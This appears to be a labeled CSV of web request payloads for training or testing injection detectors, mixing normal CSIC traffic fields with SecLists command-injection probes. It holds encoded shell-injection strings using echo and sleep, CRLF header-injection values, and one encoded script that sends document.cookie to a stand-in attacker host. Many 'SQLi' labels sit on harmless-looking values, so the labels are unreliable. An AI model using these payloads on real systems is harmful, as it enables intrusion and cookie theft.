payload,label,source
90505693A,Normal,csic_gsi:cisc_normalTraffic_test.txt
"Sol,+153+",Normal,csic_gsi:cisc_normalTraffic_train.txt
C8C564A1027866B0B21C548DA61FFCB7,Normal,csic_gsi:cisc_normalTraffic_test.txt
945D94C0BE327CAD573AABCCFD0CBD0E,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Diodoro,Normal,csic_gsi:cisc_normalTraffic_test.txt
5A75280DC46FEDD63F45A53060B20CF9,Normal,csic_gsi:cisc_normalTraffic_test.txt
A46DA8982BCC00D8BF4F911D0BF7C3E7,Normal,csic_gsi:cisc_normalTraffic_test.txt
Ventrosa,Normal,csic_gsi:cisc_normalTraffic_test.txt
CFCF02EDE13DD233147A4775A1A3D8B2,Normal,csic_gsi:cisc_normalTraffic_train.txt
E808D2A7A1B04EFF4D28729184E114C5,Normal,csic_gsi:cisc_normalTraffic_train.txt
Galindo,Normal,csic_gsi:cisc_normalTraffic_test.txt
A3583BA188FBB4213E656AA1EAFFFA6A,Normal,csic_gsi:cisc_normalTraffic_test.txt
');}print(`echo%20NPFNRM;echo%20$((91%2B52));echo%20NPFNRM;echo%20NPFNRM`)%3B%255C%255CNPFNRM,CMD,seclists_cmd
inna,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Inda,Normal,csic_gsi:cisc_normalTraffic_train.txt
03f3so,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
D19571624B106B56DBD4F5F16FB5AD17,Normal,csic_gsi:cisc_normalTraffic_test.txt
%0A%20str%3D%24%28echo%20BRBPJX%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2526,CMD,seclists_cmd
Fasnia,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
A094C532CB7B019EDF241F75AEB8A5AE,Normal,csic_gsi:cisc_normalTraffic_test.txt
&&echo%20CMMOTV$((30%2B10))$(echo%20CMMOTV)CMMOTV',CMD,seclists_cmd
FED1C74E345CFF52656A0AC4911F2C51,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
juma,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
klasky,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"modo=registro&login=winne&password=iNGoBeRNaBLe&nombre=Herm�n&apellidos=Hinestrosa&email=dacgmine@lecriture.mw&dni=65421136M&direccion=Calle+Escultor+Piquer,+S/N,+|&ciudad=Velilla&cp=26210&provincia=Barcelona&ntc=1278501676319264&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
60B79F8118FF928FF399151DAE24C392,Normal,csic_gsi:cisc_normalTraffic_test.txt
3457A9FC8319A74C42DC9AD56DB6CD1D,Normal,csic_gsi:cisc_normalTraffic_test.txt
D69B728B778D6DE611E2059877AA701D,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
E19BAD9E46E4766845018D8CF87BF981,Normal,csic_gsi:cisc_normalTraffic_test.txt
985716B8630F9AC0570A0ED881BA0D9A,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
id=3&nombre=Queso+Manchego&precio=100&cantidad=84&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_train.txt
"C/+Jose+Maria+Peman,+113,+",Normal,csic_gsi:cisc_normalTraffic_train.txt
99B7DF537DF41EFA2C20BADE73E62A2C,Normal,csic_gsi:cisc_normalTraffic_test.txt
%22%0A%20str%3D%24%28echo%20RSPYHG%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2526,CMD,seclists_cmd
khorsand@nexuspark.ye,Normal,csic_gsi:cisc_normalTraffic_test.txt
56736BF05EE960065DCA1574A969FF06,Normal,csic_gsi:cisc_normalTraffic_test.txt
CD46E475B2B99D67A7555AE14C5DD766,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=insertar&precio=1858&B1=Pasar+por+caja,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=entrar&login=mott&pwd=capiz8Na&remember=off&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_test.txt
88732A9E992DE89C1E6E05D8E82DA99A,Normal,csic_gsi:cisc_normalTraffic_train.txt
p0ralogizar,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=entrar&login=?denise&pwd=pLaSMaDoR&remember=on&B1=Entrar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
892444a9aci8,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20LOGUJR%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%205%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%252F%252F,CMD,seclists_cmd
286A45E8B685DEBA3D297ADA51525F5D,Normal,csic_gsi:cisc_normalTraffic_test.txt
B302D077DB6B3F575D0A004DDB99F8A7,Normal,csic_gsi:cisc_normalTraffic_test.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20GIKITN%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%206%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20//,CMD,seclists_cmd
4A8B26C791ABA1DDAE64D13095D4EE0A,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
print(`echo%20RREYBJ`.`echo%20$((33%2B25))`.`echo%20RREYBJ`.`echo%20RREYBJ`)%3B.%27RREYBJ,CMD,seclists_cmd
5085,Normal,csic_gsi:cisc_normalTraffic_train.txt
Agostina,Normal,csic_gsi:cisc_normalTraffic_train.txt
%22%0A%20str%3D%24%28echo%20GZRNZB%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2527,CMD,seclists_cmd
D14E30492770C24A9409862682D01ABE,Normal,csic_gsi:cisc_normalTraffic_test.txt
0251D4B229E2AB56DF03998CA52F4DAB,Normal,csic_gsi:cisc_normalTraffic_train.txt
F9927F67DD2091F22AA590985BA7A811,Normal,csic_gsi:cisc_normalTraffic_test.txt
80CDE7D4A78D2B617ECDDD1E49B52047,Normal,csic_gsi:cisc_normalTraffic_train.txt
%7C%7Cecho%20CKNPSQ$((65%2B36))$(echo%20CKNPSQ)CKNPSQ%27,CMD,seclists_cmd
2669670300165135,Normal,csic_gsi:cisc_normalTraffic_test.txt
8BA1DFACC61667371DAEAB8A21381887,Normal,csic_gsi:cisc_normalTraffic_test.txt
24370,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%27%3B%20str%3D%24%28echo%20ASBPAS%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%7C,CMD,seclists_cmd
54C6131356AAC7AA9DD8D88127F5D099,Normal,csic_gsi:cisc_normalTraffic_train.txt
F10175E8E82E4A6253B53BFC367F7A91,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%7C%20%5B%208%20-ne%20%24%28echo%20MYDVJM%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%255C%255C,CMD,seclists_cmd
Sabathiel,Normal,csic_gsi:cisc_normalTraffic_train.txt
id=1any%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
BD705355533A9E533D441C7F475C9AAB,Normal,csic_gsi:cisc_normalTraffic_test.txt
49772C7E2994B2FCB2D5549F7D105DD1,Normal,csic_gsi:cisc_normalTraffic_train.txt
DesPEsta�aR,Normal,csic_gsi:cisc_normalTraffic_train.txt
4BB075AC735B41FE6FC0DB50650D64ED,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modo=insertar&precio=9043&B1=Pasar+por+caja,Normal,csic_gsi:cisc_normalTraffic_train.txt
pennebak,Normal,csic_gsi:cisc_normalTraffic_train.txt
?T.ole/do,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
id=1&nombre=Vino+Rioja&precio=39&cantidad=47&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_test.txt
B727AE9DE6CA6FFC9A3C293B03F0F0F8,Normal,csic_gsi:cisc_normalTraffic_test.txt
"Calle+San+Blas,+98,+",Normal,csic_gsi:cisc_normalTraffic_test.txt
idA=1&nombre=Jam�n+Ib�rico&precio=100&cantidad=87&B1=A�adir+al+carrito,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
AEFABF0B989371FE670BD772F151BB48,Normal,csic_gsi:cisc_normalTraffic_test.txt
"Av.+Italia,+66,+4-A",Normal,csic_gsi:cisc_normalTraffic_train.txt
espana@flabingo.dk,Normal,csic_gsi:cisc_normalTraffic_train.txt
FDA30401994A5C01BDAEB1C64066A0F8,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
;echo%20MPCSBG$((54%2B42))$(echo%20MPCSBG)MPCSBG,CMD,seclists_cmd
F0091F7EA1E6A9887427A3B3AAA511BA,Normal,csic_gsi:cisc_normalTraffic_train.txt
Quintanilla+del+Olmo,Normal,csic_gsi:cisc_normalTraffic_test.txt
id=2&nombre=Vino+Rioja&precio=39&cantidad=77&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_train.txt
90658868K,Normal,csic_gsi:cisc_normalTraffic_train.txt
D193B7CC2BDF64E4BC2350C37A5DF4A9,Normal,csic_gsi:cisc_normalTraffic_train.txt
sendere$a2,Normal,csic_gsi:cisc_normalTraffic_train.txt
078551E7ADA3A451077D9918EC588000,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2522%3B%20str%3D%24%28echo%20LMZYDH%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%255C%255C,CMD,seclists_cmd
3747,Normal,csic_gsi:cisc_normalTraffic_test.txt
759DB9EE979C0D579F620DF8E8DBF0DF,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
65B5027895B473F0F41154408E751BB8,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
AA97EF1FA55D52272E31B47E5149CF0C,Normal,csic_gsi:cisc_normalTraffic_test.txt
10649,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Aldeanueva+de+Santa+Cruz,Normal,csic_gsi:cisc_normalTraffic_train.txt
"Avenida+Olarizu+161,+12C",Normal,csic_gsi:cisc_normalTraffic_test.txt
checklan,Normal,csic_gsi:cisc_normalTraffic_test.txt
%22%7C%20%5B%202%20-ne%20%24%28echo%20CINWSA%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2526,CMD,seclists_cmd
8157,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
3608D6B4B9B5493E49C2739B24F73682,Normal,csic_gsi:cisc_normalTraffic_train.txt
64C969C89A982CD2A50B3FDBD949EC40,Normal,csic_gsi:cisc_normalTraffic_train.txt
E4BE80F394674D370CA4B87A71964FA9,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
51B71AC6F88FA425F157CCD519CDD996,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
848E290F25B90668A34EC44D168C14C7,Normal,csic_gsi:cisc_normalTraffic_test.txt
28828668P,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
&echo$IFSCXFXGD$((63%2B87))$(echo$IFSCXFXGD)CXFXGD%2F%2F,CMD,seclists_cmd
7BAEEAA41A0CC15D09BE69122B25E41A,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"Camino+Alqueria+De+La+Campaneta,+138,+6?B",Normal,csic_gsi:cisc_normalTraffic_test.txt
pierrick,Normal,csic_gsi:cisc_normalTraffic_test.txt
%0A%20str%3D%24%28echo%20YCSCIW%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20//,CMD,seclists_cmd
modo=entrar&login=ping-she&pwd=978a4tado2a&remember=off&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=insertar&precio=535&B1=Pasar+por+caja,Normal,csic_gsi:cisc_normalTraffic_train.txt
"Bonifacio+Zamora+De+Usabel+105,+",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%22%0A%20str%3D%24%28echo%20ROWALZ%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%27,CMD,seclists_cmd
0630515936517830,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
GA+VaNza,Normal,csic_gsi:cisc_normalTraffic_train.txt
A20496C3D5D4DB31976C54A10CEA9A04,Normal,csic_gsi:cisc_normalTraffic_test.txt
||echo$IFSGUUNMQ$((78%2B22))$(echo$IFSGUUNMQ)GUUNMQ%7C,CMD,seclists_cmd
9EBD0B378FA5BD362DFBADB3B63E8292,Normal,csic_gsi:cisc_normalTraffic_test.txt
C6F2F8BB4EA7A58D5434D70EFAEF044B,Normal,csic_gsi:cisc_normalTraffic_test.txt
C8056CB3D5D805335E0F4987D011DB32,Normal,csic_gsi:cisc_normalTraffic_train.txt
jantz-le,Normal,csic_gsi:cisc_normalTraffic_test.txt
2B778DDCBFFD77291C8D12C91B38701C,Normal,csic_gsi:cisc_normalTraffic_train.txt
40290,Normal,csic_gsi:cisc_normalTraffic_train.txt
"modo=registro&login=saber&password=go81alonier&nombre=Tatiano&apellidos=Urkijo&email=whiteman@soybueno.kp&dni=20244752Z&direccion=Passatge+Bonavista,+166,+&ciudad=Granada+de+R�o-Tinto,+La&cp=42216&provincia=Ciudad+Real&ntc=3521032196623819&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
CCD170B475B2390A1AB2F1255DF0324E,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
B5E64AA3B361B1076B05BEB36FD0B4F1,Normal,csic_gsi:cisc_normalTraffic_test.txt
%22%7C%20%5B%208%20-ne%20%24%28echo%20TPTKGE%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%26,CMD,seclists_cmd
0DF85EFEB17E06FD6F1C5DA92E91064B,Normal,csic_gsi:cisc_normalTraffic_train.txt
'|echo%20LRGWPW$((14%2B39))$(echo%20LRGWPW)LRGWPW%5C%5C,CMD,seclists_cmd
E522ED545B556B33E0A205F74925BE1F,Normal,csic_gsi:cisc_normalTraffic_test.txt
E5FD8A01AF02C89E8C6587E92551D881,Normal,csic_gsi:cisc_normalTraffic_test.txt
&echo%20RCNYOU$((2%2B11))$(echo%20RCNYOU)RCNYOU|,CMD,seclists_cmd
6148,Normal,csic_gsi:cisc_normalTraffic_test.txt
87AF98B5AD942FF518470084B8DBCF1B,Normal,csic_gsi:cisc_normalTraffic_train.txt
%0aecho%20URBCMK$((17%2B54))$(echo%20URBCMK)URBCMK%27,CMD,seclists_cmd
7959619280022009,Normal,csic_gsi:cisc_normalTraffic_test.txt
&echo%20NOKSUR$((8%2B35))$(echo%20NOKSUR)NOKSUR%5C%5C,CMD,seclists_cmd
%7Cecho$IFSSUUIHX$((40%2B15))$(echo$IFSSUUIHX)SUUIHX',CMD,seclists_cmd
6EA96BBB4C95F790AF96CDAA0F1AFD91,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
07BF630BF46414AFF16ABA60CC4502FF,Normal,csic_gsi:cisc_normalTraffic_test.txt
Aregall+Picabea,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
magarill@beljos.gi,Normal,csic_gsi:cisc_normalTraffic_test.txt
eMPl�STriC+O,Normal,csic_gsi:cisc_normalTraffic_test.txt
%0A%20str%3D%24%28echo%20TYPSKV%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2527,CMD,seclists_cmd
D18C0C7FF383F8B3D8AC81AFEC9381BC,Normal,csic_gsi:cisc_normalTraffic_test.txt
%3B%20str%3D%24%28echo%20MJSZOL%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20//,CMD,seclists_cmd
"modo=registro&login=yeohoon&password=aDvErAci�N&nombre=Asad&apellidos=Pratseva+Ballano&email=anand@smalltec.bs&dni=17916298B&direccion=Plza.+Santa+Barbara,+59+&ciudad=Puebla+de+Azaba&cp=50513&provincia=Girona&ntc=2976744623292066&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
rOZnar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"La+Rosaleda,+182,+",Normal,csic_gsi:cisc_normalTraffic_test.txt
'echo$IFSMDCMCB$((27%2B53))$(echo$IFSMDCMCB)MDCMCB%26,CMD,seclists_cmd
2663409898988215,Normal,csic_gsi:cisc_normalTraffic_train.txt
8B05D94D2480AF4BFB5B6372735BA74E,Normal,csic_gsi:cisc_normalTraffic_train.txt
850D2749308621BEFA50FB7E745F201B,Normal,csic_gsi:cisc_normalTraffic_test.txt
AE74670EA0C081BB30ACC77EF43673C4,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
D1E6457F9246D9114449537DEAC56D54,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
102580ED1A021E48AA9935972713D9A4,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
5BA7C8F4C757FB7FD367DA2236AD6E8F,Normal,csic_gsi:cisc_normalTraffic_train.txt
Tristana,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
${passthru(print(`echo%20RBCHID`.`echo%20$((71%2B83))`.`echo%20RBCHID`.`echo%20RBCHID`)%3B.%27RBCHID,CMD,seclists_cmd
223A4EA8090CD96E3DA63BCFEFE4E5B7,Normal,csic_gsi:cisc_normalTraffic_test.txt
insertarany%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
3C9FBCF53B769E5C9C64EEF6BE499425,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=entrar&login=regnier&pwd=A4Ost57o&remember=on&B1A=Entrar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
DE10A7142437ADAB36EBA6F0F669331B,Normal,csic_gsi:cisc_normalTraffic_test.txt
A6D23352C6A6488BE389C12B0EE53416,Normal,csic_gsi:cisc_normalTraffic_test.txt
84BE839873709F924486EC56CEFDF62D,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
40DFBB1C6F30A7FF557DD48407AA1A5C,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
0A55EEDCFF4837752B274BCEBCD20724,Normal,csic_gsi:cisc_normalTraffic_test.txt
F1CA508F31ECD6E2ACFC462B1D0984C4,Normal,csic_gsi:cisc_normalTraffic_test.txt
3F6AD1404EE9E70A8A8702E3080702E7,Normal,csic_gsi:cisc_normalTraffic_test.txt
mombourq,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%27&echo$IFSBOCKFB$((70%2B90))$(echo$IFSBOCKFB)BOCKFB%22,CMD,seclists_cmd
078A0018D21C62A98728939CF2793D74,Normal,csic_gsi:cisc_normalTraffic_train.txt
0BB193587B65DDD2E5EAA92AB7E4718D,Normal,csic_gsi:cisc_normalTraffic_train.txt
5FEB3C9B912BC82926B0908E9E9F403B,Normal,csic_gsi:cisc_normalTraffic_train.txt
"modo=registro&login=marquart&password=viTUpeRAdOr&nombre=Gaspar&apellidos=Lest�n+Petitbernard&email=dix@carmensanmartin.tm&dni=26018474T&direccion=C/+Catedratico+Angel+Casado,+S/N+&ciudad=Riotuerto&cp=14749&provincia=Salamanca&ntc=7562944888996473&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
"C/+Alegria,+141,+12-H",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"Rua+Entrevias,+68+12-C",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%0A%20str%3D%24%28echo%20BTHZML%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%255C%255C,CMD,seclists_cmd
4180753654421138,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"modo=registro&login=cooksey&password=9820me5a&nombre=Venancia&apellidos=Montr�s+Benazet&email=kowalska@carmensanmartin.uz&dni=23683952R&direccion=C/+Faicanes+167,+8B&ciudad=Caravaca+de+la+Cruz&cp=17539&provincia=Salamanca&ntc=3891909303541723&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_train.txt
indiv!idualmente,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
86DCE1BB908BD3F573AF7D64712D9C9E,Normal,csic_gsi:cisc_normalTraffic_test.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20IYHUSO%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%204%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%7C,CMD,seclists_cmd
A4BDB12EFD20F273D7EC5BC8F19EB723,Normal,csic_gsi:cisc_normalTraffic_train.txt
Barceo,Normal,csic_gsi:cisc_normalTraffic_train.txt
87721362Y,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
97B680E2B31F9671C57DCA7EE67C0972,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=entrar&login=viswa&pwd=0sc9d25.2&remember=on/&B1=Entrar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
4B5CD4D6354671BACD183F45DF4F5B73,Normal,csic_gsi:cisc_normalTraffic_train.txt
;echo%20FRDAGY$((96%2B63))$(echo%20FRDAGY)FRDAGY//,CMD,seclists_cmd
registrosessionid=12312312&+username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73+%63%72%69%70%74%3E?,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%0A%20str%3D%24%28echo%20WBNIBQ%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%26,CMD,seclists_cmd
kingsly,Normal,csic_gsi:cisc_normalTraffic_test.txt
32B0B6B092177CCA6CD42D53B5472143,Normal,csic_gsi:cisc_normalTraffic_train.txt
kawada@13horas.no,Normal,csic_gsi:cisc_normalTraffic_test.txt
%3B%20str%3D%24%28echo%20TNPFBA%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%27,CMD,seclists_cmd
%26%20echo%20QJINVP$((61%2B57))$(echo%20QJINVP)QJINVP,CMD,seclists_cmd
7AFBB6AAD32E0049B9C8EB3361F1DC40,Normal,csic_gsi:cisc_normalTraffic_test.txt
"Calle+Poligono+Quintos,+37,+",Normal,csic_gsi:cisc_normalTraffic_train.txt
""")print(`echo%20XCIHWH%0aecho%20$((57%2B90))%0aecho%20XCIHWH%0aecho%20XCIHWH`)%3B.%252522XCIHWH",CMD,seclists_cmd
6D041A6D6A39B8218E3F3F261D81D06A,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
4275EDCE1D1F0738A5F567E4652A5825,Normal,csic_gsi:cisc_normalTraffic_test.txt
1CD420C6102E46239E9831F2F32973D8,Normal,csic_gsi:cisc_normalTraffic_train.txt
dower,Normal,csic_gsi:cisc_normalTraffic_test.txt
11A3784812CC4DC7E615B53821899099,Normal,csic_gsi:cisc_normalTraffic_train.txt
5ED3888392A2E82B23E773BA8E5B2B56,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modo=registro&login=vilma&password=73t4h5mbre4&nombre=Rez&apellidos=Calzada+Rebassa&email=vestly.pereda@ladigianni.eh&dni=72094500B&direccion=Joan+De+Joanes+61+3?H&ciudad=Benalup-Casas+Viejas&cp=26291&provincia=Toledo&ntc=8185948553220105&B1=Registrar,Normal,csic_gsi:cisc_normalTraffic_train.txt
"C/+San+Jose+121,+11?D",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
8383AC5A0D79D49DB415D78F5145F8D9,Normal,csic_gsi:cisc_normalTraffic_train.txt
7D3203C171C18E117BBDB2D161BCFB17,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
96876092T,Normal,csic_gsi:cisc_normalTraffic_test.txt
"Padre+Isla,+S/N,+",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
86E1BF00D0593A4A0FADFE39427CFC1A,Normal,csic_gsi:cisc_normalTraffic_test.txt
)print(`echo%20ECXTUU;echo%20$((10%2B67));echo%20ECXTUU;echo%20ECXTUU`)%3B%2523ECXTUU,CMD,seclists_cmd
kristjan,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
7541405746725221,Normal,csic_gsi:cisc_normalTraffic_test.txt
1D4FD9D1C93B7986B3DCA836DDEE0634,Normal,csic_gsi:cisc_normalTraffic_test.txt
43927FC0064EBA404F252B49BF40C4EF,Normal,csic_gsi:cisc_normalTraffic_train.txt
%26%26echo$IFSAOUDEZ$((1%2B19))$(echo$IFSAOUDEZ)AOUDEZ%7C,CMD,seclists_cmd
%27%7C%20%5B%201%20-ne%20%24%28echo%20FNEGWH%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%7C,CMD,seclists_cmd
B4CBC75902BB74781B57E6D692E29940,Normal,csic_gsi:cisc_normalTraffic_test.txt
Carrer+Bruselles+112+1C,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%27;echo$IFSWZVYQZ$((68%2B9))$(echo$IFSWZVYQZ)WZVYQZ%7C,CMD,seclists_cmd
baker-oftebro@cpanelweb.com.so,Normal,csic_gsi:cisc_normalTraffic_test.txt
id=any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727%0D%0A,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%0A%20str%3D%24%28echo%20NFRBHV%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%27,CMD,seclists_cmd
%7C%20%5B%201%20-ne%20%24%28echo%20MCLZRV%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%257C,CMD,seclists_cmd
